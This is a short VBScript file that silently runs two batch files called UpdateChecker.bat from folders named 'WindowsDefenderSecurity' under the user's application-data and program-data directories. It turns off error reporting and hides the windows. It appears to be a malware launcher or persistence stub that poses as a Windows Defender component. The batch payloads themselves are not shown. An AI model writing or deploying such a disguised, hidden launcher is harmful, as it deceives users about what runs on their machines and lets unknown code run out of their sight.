On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\WindowsDefenderSecurity\UpdateChecker.bat",0,True
WshShell.Run "%PROGRAMDATA%\WindowsDefenderSecurity\UpdateChecker.bat",0,True